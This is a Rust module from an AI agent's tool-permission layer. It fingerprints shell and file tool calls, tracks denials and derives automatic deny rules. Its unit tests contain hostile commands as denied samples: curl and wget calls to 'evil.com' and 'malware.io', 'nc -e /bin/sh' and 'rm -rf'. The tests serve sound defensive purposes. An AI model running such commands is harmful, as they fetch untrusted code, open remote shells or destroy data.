//! Command/path-aware approval fingerprints and denial tracking.
//!
//! Instead of keying session overrides by bare tool name (`"bash" → allow`),
//! this module produces content-aware fingerprints that distinguish between
//! e.g. `bash("git status")` and `bash("rm -rf /")`. Denial tracking implements
//! consecutive/total limits inspired by Claude Code's `denialTracking.ts`,
//! preventing infinite approval loops from stalling sessions.
//!
//! Phase C enhancement: When 2+ denials share a similar pattern (same tool +
//! command prefix, or same denial reason keyword), auto-generates session deny
//! rules via `extract_auto_deny_rules()`.

use std::collections::HashMap;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

use serde::{Deserialize, Serialize};

use crate::orchestration::permission_sync::PermissionRule;

// ─── Approval Fingerprint ────────────────────────────────────────────────────

/// Side-effect classification for a tool invocation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SideEffectClass {
    /// Pure read: no filesystem/network/state mutation.
    ReadOnly,
    /// Writes to filesystem, database, or external service.
    Write,
    /// Executes arbitrary code (bash, eval, etc.).
    Execute,
    /// Unknown or unclassifiable.
    Unknown,
}

/// Content-aware fingerprint for a tool approval decision.
///
/// Two invocations with the same fingerprint are considered equivalent for
/// approval purposes: if the user approved one, the other is auto-approved
/// for the rest of the session.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct ApprovalFingerprint {
    /// Tool name (e.g., `"bash"`, `"write_file"`, `"mcp_github_create_issue"`).
    pub tool_name: String,
    /// Normalized command prefix for shell tools (e.g., `"git commit"`).
    /// `None` for non-shell tools.
    pub command_prefix: Option<String>,
    /// Target path pattern for file tools (e.g., `"src/lib.rs"`, `"src/**"`).
    /// `None` for non-file tools or when path is not extractable.
    pub path_pattern: Option<String>,
    /// Side-effect classification.
    pub side_effect: SideEffectClass,
}

impl ApprovalFingerprint {
    /// Create a fingerprint for a shell command.
    pub fn shell(tool_name: &str, command: &str, is_read_only: bool) -> Self {
        let prefix = extract_command_prefix(command);
        Self {
            tool_name: tool_name.to_lowercase(),
            command_prefix: Some(prefix),
            path_pattern: None,
            side_effect: if is_read_only {
                SideEffectClass::ReadOnly
            } else {
                SideEffectClass::Execute
            },
        }
    }

    /// Create a fingerprint for a file operation.
    pub fn file_op(tool_name: &str, path: Option<&str>) -> Self {
        Self {
            tool_name: tool_name.to_lowercase(),
            command_prefix: None,
            path_pattern: path.map(normalize_path_pattern),
            side_effect: SideEffectClass::Write,
        }
    }

    /// Create a bare fingerprint (tool name only, no content awareness).
    pub fn bare(tool_name: &str) -> Self {
        Self {
            tool_name: tool_name.to_lowercase(),
            command_prefix: None,
            path_pattern: None,
            side_effect: SideEffectClass::Unknown,
        }
    }

    /// Stable hash for storage/lookup.
    #[must_use]
    pub fn stable_hash(&self) -> u64 {
        let mut h = DefaultHasher::new();
        self.hash(&mut h);
        h.finish()
    }

    /// Whether this fingerprint matches (subsumes) another.
    ///
    /// A broader fingerprint (e.g., `bash` with no command prefix) matches
    /// a narrower one (e.g., `bash` with `"git commit"` prefix).
    #[must_use]
    pub fn matches(&self, other: &Self) -> bool {
        if self.tool_name != other.tool_name {
            return false;
        }
        // If self has no command prefix, it matches any command for this tool.
        if let Some(ref my_prefix) = self.command_prefix {
            match &other.command_prefix {
                Some(their_prefix) => {
                    if !their_prefix.starts_with(my_prefix.as_str()) {
                        return false;
                    }
                }
                None => return false,
            }
        }
        // If self has no path pattern, it matches any path for this tool.
        if let Some(ref my_path) = self.path_pattern {
            match &other.path_pattern {
                Some(their_path) => {
                    if !path_pattern_matches(my_path, their_path) {
                        return false;
                    }
                }
                None => return false,
            }
        }
        true
    }

    /// Human-readable summary for display.
    #[must_use]
    pub fn display_summary(&self) -> String {
        let mut parts = vec![self.tool_name.clone()];
        if let Some(ref prefix) = self.command_prefix {
            parts.push(format!("cmd:{prefix}"));
        }
        if let Some(ref path) = self.path_pattern {
            parts.push(format!("path:{path}"));
        }
        parts.join(" | ")
    }
}

impl std::fmt::Display for ApprovalFingerprint {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.display_summary())
    }
}

/// Extract a normalized command prefix from a shell command.
///
/// Takes the first 1-2 meaningful tokens (skipping `cd ... &&` prefixes and
/// environment variable assignments) to produce a grouping key.
///
/// # Examples
/// - `"git commit -m 'hello'"` → `"git commit"`
/// - `"cd /tmp && ls -la"` → `"ls"`
/// - `"RUST_LOG=debug cargo test"` → `"cargo test"`
/// - `"npm run build"` → `"npm run"`
fn extract_command_prefix(command: &str) -> String {
    let cmd = command.trim();

    // Strip cd prefix.
    let cmd = if cmd.starts_with("cd ") {
        cmd.split("&&").nth(1).map(str::trim).unwrap_or(cmd)
    } else {
        cmd
    };

    // Strip environment variable assignments (FOO=bar ...).
    let cmd = cmd
        .split_whitespace()
        .skip_while(|t| t.contains('=') && !t.starts_with('-'))
        .collect::<Vec<_>>()
        .join(" ");

    // Take up to 2 tokens for the prefix.
    let tokens: Vec<&str> = cmd.split_whitespace().take(2).collect();
    tokens.join(" ")
}

/// Normalize a file path into a pattern suitable for approval matching.
///
/// Strips trailing components beyond depth 2 to group by directory.
fn normalize_path_pattern(path: &str) -> String {
    let path = path.trim();
    // Keep the directory and immediate parent for grouping.
    let parts: Vec<&str> = path.split('/').filter(|p| !p.is_empty()).collect();
    if parts.len() <= 2 {
        path.to_string()
    } else {
        // Keep first two path segments + wildcard.
        format!("{}/{}/**", parts[0], parts[1])
    }
}

/// Check if a stored path pattern matches a candidate path.
fn path_pattern_matches(pattern: &str, candidate: &str) -> bool {
    if pattern == candidate {
        return true;
    }
    if let Some(prefix) = pattern.strip_suffix("/**") {
        return candidate.starts_with(prefix);
    }
    false
}

// ─── Denial Tracking ─────────────────────────────────────────────────────────

/// Limits for denial tracking (inspired by Claude Code's `denialTracking.ts`).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DenialLimits {
    /// Max consecutive denials for the same fingerprint before fallback.
    pub max_consecutive: u32,
    /// Max total denials across all fingerprints in a session.
    pub max_total: u32,
}

impl Default for DenialLimits {
    fn default() -> Self {
        Self {
            max_consecutive: 3,
            max_total: 20,
        }
    }
}

/// Tracks approval denials to detect and break denial loops.
///
/// When a tool is denied too many times (consecutively or cumulatively),
/// the tracker signals that the session should fall back to a different
/// strategy (e.g., ask the user for explicit guidance, skip the tool,
/// or abort the task).
///
/// Phase C: Also records denial reasons and fingerprint details to
/// auto-generate session deny rules when patterns repeat.
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct DenialTracker {
    /// Per-fingerprint consecutive denial count.
    consecutive: HashMap<u64, u32>,
    /// Per-fingerprint last-seen decision.
    last_decision: HashMap<u64, bool>,
    /// Total denials in this session.
    total_denials: u32,
    /// Limits.
    limits: DenialLimits,
    /// Denial history for auto-rule extraction (tool_name, command_prefix, reason).
    denial_history: Vec<(String, Option<String>, Option<String>)>,
}

/// What the denial tracker recommends after a denial.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DenialAction {
    /// Normal denial; keep prompting.
    Continue,
    /// Too many consecutive denials for this fingerprint; skip it.
    SkipTool,
    /// Too many total denials; fall back to user guidance.
    FallbackToUser,
}

impl DenialTracker {
    /// Create a new tracker with custom limits.
    pub fn with_limits(limits: DenialLimits) -> Self {
        Self {
            limits,
            ..Default::default()
        }
    }

    /// Record an approval decision and return recommended action.
    pub fn record(&mut self, fingerprint: &ApprovalFingerprint, approved: bool) -> DenialAction {
        self.record_with_reason(fingerprint, approved, None)
    }

    /// Record an approval decision with optional denial reason.
    pub fn record_with_reason(
        &mut self,
        fingerprint: &ApprovalFingerprint,
        approved: bool,
        reason: Option<&str>,
    ) -> DenialAction {
        let hash = fingerprint.stable_hash();

        if approved {
            self.consecutive.remove(&hash);
            self.last_decision.insert(hash, true);
            return DenialAction::Continue;
        }

        // Denied — record for auto-rule extraction.
        self.denial_history.push((
            fingerprint.tool_name.clone(),
            fingerprint.command_prefix.clone(),
            reason.map(String::from),
        ));

        self.total_denials += 1;
        let consecutive = self.consecutive.entry(hash).or_insert(0);
        *consecutive += 1;
        self.last_decision.insert(hash, false);

        if *consecutive >= self.limits.max_consecutive {
            return DenialAction::SkipTool;
        }
        if self.total_denials >= self.limits.max_total {
            return DenialAction::FallbackToUser;
        }
        DenialAction::Continue
    }

    /// Check what action should be taken for a fingerprint before prompting.
    #[must_use]
    pub fn should_prompt(&self, fingerprint: &ApprovalFingerprint) -> DenialAction {
        let hash = fingerprint.stable_hash();
        if let Some(&count) = self.consecutive.get(&hash) {
            if count >= self.limits.max_consecutive {
                return DenialAction::SkipTool;
            }
        }
        if self.total_denials >= self.limits.max_total {
            return DenialAction::FallbackToUser;
        }
        DenialAction::Continue
    }

    /// Total denials recorded.
    #[must_use]
    pub fn total_denials(&self) -> u32 {
        self.total_denials
    }

    /// Reset all tracking state.
    pub fn reset(&mut self) {
        self.consecutive.clear();
        self.last_decision.clear();
        self.total_denials = 0;
        self.denial_history.clear();
    }

    /// Extract auto-deny rules from repeated denial patterns.
    ///
    /// Returns `PermissionRule`s for patterns that were denied 2+ times:
    /// - Same (tool, command_prefix) pair
    /// - Same tool denied with any command 3+ times → bare tool rule
    ///
    /// Call this periodically (e.g., after each turn) to propagate auto-rules
    /// to `PermissionSyncContext`.
    #[must_use]
    pub fn extract_auto_deny_rules(&self) -> Vec<PermissionRule> {
        use std::collections::HashMap;

        let mut rules = Vec::new();

        // Count (tool, prefix) pairs
        let mut pair_counts: HashMap<(String, Option<String>), u32> = HashMap::new();
        // Count bare tool denials
        let mut tool_counts: HashMap<String, u32> = HashMap::new();

        for (tool, prefix, _reason) in &self.denial_history {
            let key = (tool.clone(), prefix.clone());
            *pair_counts.entry(key).or_insert(0) += 1;
            *tool_counts.entry(tool.clone()).or_insert(0) += 1;
        }

        // Generate rules for pairs denied 2+ times
        for ((tool, prefix), count) in pair_counts {
            if count >= 2 {
                let rule = match prefix {
                    Some(p) => PermissionRule::with_pattern(&tool, &p),
                    None => PermissionRule::tool(&tool),
                };
                if !rules.contains(&rule) {
                    rules.push(rule);
                }
            }
        }

        // If a bare tool has 3+ denials (any prefix), add bare rule
        for (tool, count) in tool_counts {
            if count >= 3 {
                let bare = PermissionRule::tool(&tool);
                if !rules.contains(&bare) {
                    rules.push(bare);
                }
            }
        }

        rules
    }
}

// ─── Fingerprinted Session Overrides ─────────────────────────────────────────

/// Session-scoped approval overrides keyed by content-aware fingerprints.
///
/// Replaces the previous `HashMap<String, bool>` (tool-name-only) with
/// fingerprint-aware matching that distinguishes between different commands
/// and paths for the same tool.
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct FingerprintedOverrides {
    /// Ordered list of (fingerprint, allowed) rules, checked in insertion order.
    rules: Vec<(ApprovalFingerprint, bool)>,
}

impl FingerprintedOverrides {
    /// Look up whether a fingerprint is covered by an existing override.
    #[must_use]
    pub fn check(&self, fingerprint: &ApprovalFingerprint) -> Option<bool> {
        for (stored, allowed) in &self.rules {
            if stored.matches(fingerprint) {
                return Some(*allowed);
            }
        }
        None
    }

    /// Insert a new override. Returns whether it replaced an existing rule.
    pub fn insert(&mut self, fingerprint: ApprovalFingerprint, allowed: bool) -> bool {
        // Check for exact duplicate.
        for (stored, existing_allowed) in &mut self.rules {
            if *stored == fingerprint {
                let replaced = *existing_allowed != allowed;
                *existing_allowed = allowed;
                return replaced;
            }
        }
        self.rules.push((fingerprint, allowed));
        false
    }

    /// Export as legacy-compatible tool-name overrides for child inheritance.
    #[must_use]
    pub fn to_legacy_overrides(&self) -> HashMap<String, bool> {
        let mut legacy = HashMap::new();
        for (fp, allowed) in &self.rules {
            // Legacy format: tool name → broadest decision.
            legacy.entry(fp.tool_name.clone()).or_insert(*allowed);
        }
        legacy
    }

    /// Number of stored overrides.
    #[must_use]
    pub fn len(&self) -> usize {
        self.rules.len()
    }

    /// Whether no overrides are stored.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// Iterate over all stored overrides.
    pub fn iter(&self) -> impl Iterator<Item = &(ApprovalFingerprint, bool)> {
        self.rules.iter()
    }

    /// Serialize to JSON for checkpoint persistence.
    /// Returns `None` if there are no overrides to persist.
    #[must_use]
    pub fn to_json(&self) -> Option<serde_json::Value> {
        if self.rules.is_empty() {
            return None;
        }
        serde_json::to_value(self).ok()
    }

    /// Merge overrides restored from a checkpoint.
    /// Session-priority merge: existing (live) overrides take precedence over
    /// restored ones, so a user who changed their mind mid-session wins.
    pub fn merge_from_json(&mut self, json: &serde_json::Value) {
        let Ok(restored) = serde_json::from_value::<FingerprintedOverrides>(json.clone()) else {
            return;
        };
        for (fp, allowed) in restored.rules {
            // Only insert if no live override already covers this fingerprint.
            if self.check(&fp).is_none() {
                self.rules.push((fp, allowed));
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_fingerprint_extracts_prefix() {
        let fp = ApprovalFingerprint::shell("bash", "git commit -m 'hello'", false);
        assert_eq!(fp.tool_name, "bash");
        assert_eq!(fp.command_prefix.as_deref(), Some("git commit"));
        assert_eq!(fp.side_effect, SideEffectClass::Execute);
    }

    #[test]
    fn shell_fingerprint_strips_cd_prefix() {
        let fp = ApprovalFingerprint::shell("bash", "cd /tmp && ls -la", true);
        assert_eq!(fp.command_prefix.as_deref(), Some("ls -la"));
        assert_eq!(fp.side_effect, SideEffectClass::ReadOnly);
    }

    #[test]
    fn shell_fingerprint_strips_env_vars() {
        let fp = ApprovalFingerprint::shell("bash", "RUST_LOG=debug cargo test", false);
        assert_eq!(fp.command_prefix.as_deref(), Some("cargo test"));
    }

    #[test]
    fn file_op_normalizes_deep_paths() {
        let fp = ApprovalFingerprint::file_op("write_file", Some("src/turn/interruption.rs"));
        assert_eq!(fp.path_pattern.as_deref(), Some("src/turn/**"));
    }

    #[test]
    fn file_op_preserves_shallow_paths() {
        let fp = ApprovalFingerprint::file_op("write_file", Some("Cargo.toml"));
        assert_eq!(fp.path_pattern.as_deref(), Some("Cargo.toml"));
    }

    #[test]
    fn bare_fingerprint_matches_any_content() {
        let broad = ApprovalFingerprint::bare("bash");
        let narrow = ApprovalFingerprint::shell("bash", "git status", true);
        assert!(broad.matches(&narrow));
        assert!(!narrow.matches(&broad));
    }

    #[test]
    fn prefix_matching_respects_word_boundary() {
        let git = ApprovalFingerprint::shell("bash", "git commit", false);
        let git_status = ApprovalFingerprint::shell("bash", "git status", false);
        assert!(!git.matches(&git_status)); // "git commit" doesn't match "git status"
    }

    #[test]
    fn path_pattern_matching() {
        let broad = ApprovalFingerprint::file_op("write_file", Some("src/turn/interruption.rs"));
        let same_dir = ApprovalFingerprint::file_op("write_file", Some("src/turn/host.rs"));
        // Both normalize to "src/turn/**"
        assert!(broad.matches(&same_dir));
    }

    #[test]
    fn denial_tracker_consecutive_limit() {
        let mut tracker = DenialTracker::with_limits(DenialLimits {
            max_consecutive: 3,
            max_total: 100,
        });
        let fp = ApprovalFingerprint::bare("bash");

        assert_eq!(tracker.record(&fp, false), DenialAction::Continue);
        assert_eq!(tracker.record(&fp, false), DenialAction::Continue);
        assert_eq!(tracker.record(&fp, false), DenialAction::SkipTool);
    }

    #[test]
    fn denial_tracker_resets_on_approval() {
        let mut tracker = DenialTracker::with_limits(DenialLimits {
            max_consecutive: 3,
            max_total: 100,
        });
        let fp = ApprovalFingerprint::bare("bash");

        tracker.record(&fp, false);
        tracker.record(&fp, false);
        tracker.record(&fp, true); // resets consecutive
        assert_eq!(tracker.record(&fp, false), DenialAction::Continue); // starts over
    }

    #[test]
    fn denial_tracker_total_limit() {
        let mut tracker = DenialTracker::with_limits(DenialLimits {
            max_consecutive: 100,
            max_total: 3,
        });

        let fp1 = ApprovalFingerprint::bare("bash");
        let fp2 = ApprovalFingerprint::bare("write_file");
        let fp3 = ApprovalFingerprint::bare("read_file");

        tracker.record(&fp1, false);
        tracker.record(&fp2, false);
        assert_eq!(tracker.record(&fp3, false), DenialAction::FallbackToUser);
    }

    #[test]
    fn fingerprinted_overrides_lookup() {
        let mut overrides = FingerprintedOverrides::default();

        let git = ApprovalFingerprint::shell("bash", "git commit", false);
        overrides.insert(git, true);

        let git_status = ApprovalFingerprint::shell("bash", "git status", true);
        // "git commit" override doesn't match "git status"
        assert_eq!(overrides.check(&git_status), None);

        // But if we add a broad bash override...
        overrides.insert(ApprovalFingerprint::bare("bash"), true);
        assert_eq!(overrides.check(&git_status), Some(true));
    }

    #[test]
    fn fingerprinted_overrides_to_legacy() {
        let mut overrides = FingerprintedOverrides::default();
        overrides.insert(
            ApprovalFingerprint::shell("bash", "git commit", false),
            true,
        );
        overrides.insert(
            ApprovalFingerprint::file_op("write_file", Some("src/main.rs")),
            true,
        );

        let legacy = overrides.to_legacy_overrides();
        assert_eq!(legacy.get("bash"), Some(&true));
        assert_eq!(legacy.get("write_file"), Some(&true));
    }

    #[test]
    fn should_prompt_checks_limits() {
        let mut tracker = DenialTracker::with_limits(DenialLimits {
            max_consecutive: 2,
            max_total: 100,
        });
        let fp = ApprovalFingerprint::bare("bash");

        assert_eq!(tracker.should_prompt(&fp), DenialAction::Continue);
        tracker.record(&fp, false);
        assert_eq!(tracker.should_prompt(&fp), DenialAction::Continue);
        tracker.record(&fp, false);
        assert_eq!(tracker.should_prompt(&fp), DenialAction::SkipTool);
    }

    // ─── Phase C: Auto-deny rule extraction ──────────────────────────

    #[test]
    fn auto_deny_rules_empty_when_no_denials() {
        let tracker = DenialTracker::default();
        assert!(tracker.extract_auto_deny_rules().is_empty());
    }

    #[test]
    fn auto_deny_rules_empty_for_single_denial() {
        let mut tracker = DenialTracker::default();
        let fp = ApprovalFingerprint::shell("bash", "rm -rf", false);
        tracker.record_with_reason(&fp, false, Some("dangerous"));
        assert!(tracker.extract_auto_deny_rules().is_empty());
    }

    #[test]
    fn auto_deny_rules_generated_for_repeated_prefix() {
        let mut tracker = DenialTracker::default();
        let fp = ApprovalFingerprint::shell("bash", "rm -rf /tmp", false);
        tracker.record_with_reason(&fp, false, Some("dangerous"));
        tracker.record_with_reason(&fp, false, Some("still dangerous"));

        let rules = tracker.extract_auto_deny_rules();
        assert_eq!(rules.len(), 1);
        assert_eq!(rules[0].tool, "bash");
        assert_eq!(rules[0].pattern, Some("rm -rf".to_string()));
    }

    #[test]
    fn auto_deny_rules_bare_tool_after_three_denials() {
        let mut tracker = DenialTracker::default();

        // Deny bash with different prefixes
        tracker.record_with_reason(
            &ApprovalFingerprint::shell("bash", "curl https://evil.com", false),
            false,
            None,
        );
        tracker.record_with_reason(
            &ApprovalFingerprint::shell("bash", "wget https://malware.io", false),
            false,
            None,
        );
        tracker.record_with_reason(
            &ApprovalFingerprint::shell("bash", "nc -e /bin/sh", false),
            false,
            None,
        );

        let rules = tracker.extract_auto_deny_rules();
        // Should have bare "bash" rule since 3+ different denials
        assert!(
            rules
                .iter()
                .any(|r| r.tool == "bash" && r.pattern.is_none())
        );
    }

    #[test]
    fn auto_deny_rules_reset_clears_history() {
        let mut tracker = DenialTracker::default();
        let fp = ApprovalFingerprint::shell("bash", "rm -rf", false);
        tracker.record_with_reason(&fp, false, None);
        tracker.record_with_reason(&fp, false, None);

        assert!(!tracker.extract_auto_deny_rules().is_empty());

        tracker.reset();
        assert!(tracker.extract_auto_deny_rules().is_empty());
    }

    #[test]
    fn fingerprinted_overrides_roundtrip_json() {
        let mut overrides = FingerprintedOverrides::default();
        overrides.insert(
            ApprovalFingerprint::shell("bash", "git commit -m 'wip'", false),
            true,
        );
        overrides.insert(
            ApprovalFingerprint::file_op("write_file", Some("src/main.rs")),
            false,
        );

        let json = overrides.to_json().expect("non-empty should serialize");
        let mut restored = FingerprintedOverrides::default();
        restored.merge_from_json(&json);

        assert_eq!(restored.len(), 2);
        let git_fp = ApprovalFingerprint::shell("bash", "git commit -m 'test'", false);
        assert_eq!(restored.check(&git_fp), Some(true));
    }

    #[test]
    fn fingerprinted_overrides_empty_returns_none() {
        let overrides = FingerprintedOverrides::default();
        assert!(overrides.to_json().is_none());
    }

    #[test]
    fn merge_from_json_does_not_overwrite_existing() {
        let mut live = FingerprintedOverrides::default();
        live.insert(ApprovalFingerprint::bare("bash"), false); // denied in live session

        let mut checkpoint = FingerprintedOverrides::default();
        checkpoint.insert(ApprovalFingerprint::bare("bash"), true); // allowed in checkpoint
        let json = checkpoint.to_json().unwrap();

        live.merge_from_json(&json);
        // Live (deny) wins over checkpoint (allow).
        let fp = ApprovalFingerprint::shell("bash", "ls", true);
        assert_eq!(live.check(&fp), Some(false));
    }

    #[test]
    fn denial_tracker_roundtrip_json() {
        let mut tracker = DenialTracker::with_limits(DenialLimits {
            max_consecutive: 3,
            max_total: 10,
        });
        let fp = ApprovalFingerprint::bare("bash");
        tracker.record(&fp, false);
        tracker.record(&fp, false);

        let json = serde_json::to_value(&tracker).unwrap();
        let restored: DenialTracker = serde_json::from_value(json).unwrap();
        assert_eq!(restored.total_denials(), 2);
    }
}
